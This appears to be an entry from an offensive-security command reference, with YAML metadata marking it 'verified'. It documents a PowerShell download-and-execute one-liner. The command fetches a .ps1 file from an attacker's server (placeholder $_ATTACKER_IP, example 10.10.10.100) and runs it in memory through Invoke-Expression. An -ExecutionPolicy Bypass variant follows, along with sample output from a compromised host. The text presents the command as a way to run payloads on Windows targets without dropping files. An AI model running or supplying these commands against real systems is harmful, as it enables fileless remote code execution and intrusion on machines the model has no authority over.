---
type: command
executor: powershell
data: >-
  Invoke-Expression (New-Object
  Net.WebClient).DownloadString("http://$_ATTACKER_IP/$_FILENAME.ps1")
output: >-
  PS C:\> Invoke-Expression (New-Object
  Net.WebClient).DownloadString("http://10.10.10.100/shell.ps1")

  # Output depends on script, e.g.,

  Whoami: target\user

  Download complete, script executed.
platforms:
  - Windows
tags:
  - execution
  - powershell
  - network
verified: true
validated: true
---

# PowerShell Invoke-Expression Download String

## Command

```powershell
Invoke-Expression (New-Object Net.WebClient).DownloadString("http://$_ATTACKER_IP/$_FILENAME.ps1")
```

## Description

This command downloads the content of a PowerShell script (.ps1) from a remote HTTP endpoint using Net.WebClient and immediately executes it in memory via Invoke-Expression. Use it when you need to run remote code on a Windows target without file drops, ideal for initial payload execution after gaining shell access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ATTACKER_IP | IP address or hostname of the attacker's web server hosting the script | Yes |
| $_FILENAME | Name of the .ps1 file to download and execute (e.g., shell.ps1) | Yes |

## Examples

### Basic Usage

```powershell
Invoke-Expression (New-Object Net.WebClient).DownloadString("http://10.10.10.100/payload.ps1")
```

This fetches payload.ps1 from 10.10.10.100 and runs it.

### Advanced Usage

If execution policy is restricted, wrap in a bypass:

```powershell
powershell.exe -ExecutionPolicy Bypass -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://$_ATTACKER_IP/$_FILENAME.ps1')"
```

## Expected Output

The output mirrors what the downloaded script produces. For example, if the script contains `Write-Output 'Script executed successfully'`, you see:

```
Script executed successfully
```

No output or errors like 'Access Denied' indicate failure (e.g., policy or network issues). Successful execution shows the script's results without download errors.

## Related

- [[procedures/download-and-execute-remote-powershell-script]]
